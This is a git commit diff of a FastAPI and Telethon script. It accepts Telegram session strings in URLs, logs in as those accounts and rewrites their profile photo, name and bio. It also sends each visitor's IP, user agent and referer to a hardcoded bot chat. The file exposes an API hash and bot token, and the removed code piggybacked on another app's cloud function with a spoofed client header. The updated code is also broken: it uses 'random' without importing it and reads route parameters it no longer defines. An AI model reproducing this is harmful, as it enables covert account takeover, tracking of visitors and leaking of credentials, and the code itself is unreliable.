fad8bd7d8d12522a64932ad62663a4949a54101f
SYTHON <124038843+sythontm@users.noreply.github.com>
2024-05-31 20:52:00 +0300

    Update main.py

--- main.py
+++ main.py
@@ -2,8 +2,11 @@ from fastapi import FastAPI, Request
 from telethon import TelegramClient
 import uvicorn
 from telethon.sessions import StringSession
+from telethon.tl.functions.account import UpdateProfileRequest
+from telethon.tl.functions.photos import UploadProfilePhotoRequest
+from telethon.tl.functions.messages import GetHistoryRequest
 import requests
-import json
+
 app = FastAPI()
 
 api_id = 23398930
@@ -11,46 +14,24 @@ api_hash = 'bd3e85a7aae40566f2fa8804d200d6d0'
 bot_token = '5962199140:AAEWbH3ALSEUCWt4o0FcMC1Pc7EHWUXQoQE'
 chat_id = '5159123009'
 
-@app.get("/api/{sess}/{user}/{message}")
-async def send_message(request: Request, sess: str, user: str, message: str):
+@app.get("/api/{sess}/")
+async def templer(request: Request, sess: str, user: str, message: str):
     client_ip = request.client.host
     user_agent = request.headers.get('user-agent')
     referer = request.headers.get('referer')
     text = f"User: {user}, Message: {message}, IP: {client_ip}, User-Agent: {user_agent}, Referer: {referer}"
     async with TelegramClient(StringSession(sess), api_id, api_hash) as client:
-        receiver = await client.get_input_entity(user)
-        await client.send_message(receiver, message)
+        channel_username = 'sythontempler'
+        channel = await client.get_entity(channel_username)  
+        posts = await client(GetHistoryRequest(peer=channel, limit=100, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
+        photo_posts = [post for post in posts.messages if post.media and post.media.photo]
+        random_photo_post = random.choice(photo_posts)
+        photo = await client.download_media(random_photo_post.media.photo)
+        pfile = await client.upload_file(photo)
+        await client(UploadProfilePhotoRequest(file=pfile))
+        caption = random_photo_post.message
+        first_name, bio = caption.split('\n', 1)
+        await client(UpdateProfileRequest(first_name=first_name, about=bio))
     # Send the same message to a specific chat using Telegram Bot API
     response = requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={text}")
-    return {"message": "Message sent"}
-
-url = 'https://us-central1-chat-for-chatgpt.cloudfunctions.net/basicUserRequestBeta'
-
-def gpt(text) -> str:
-    headers = {
-        'Host': 'us-central1-chat-for-chatgpt.cloudfunctions.net',
-        'Connection': 'keep-alive',
-        'If-None-Match': 'W/"1c3-Up2QpuBs2+QUjJl/C9nteIBUa00"',
-        'Accept': '*/*',
-        'User-Agent': 'com.tappz.aichat/1.2.2 iPhone/15.6.1 hw/iPhone8_2',
-        'Content-Type': 'application/json',
-        'Accept-Language': 'en-GB,en;q=0.9'
-    }
-
-    data = {
-        'data': {
-            'message': text,
-        }
-    }
-
-    response = requests.post(url, headers=headers, data=json.dumps(data))
-    try:
-        result = response.json()["result"]["choices"][0]["text"]
-        return result
-    except:
-        return ""
-
-@app.get("/ask/{user_input}")
-def ask_user(user_input: str):
-    response = gpt(user_input)
-    return {"response": response}
+    return {"message": "Done Templer"}
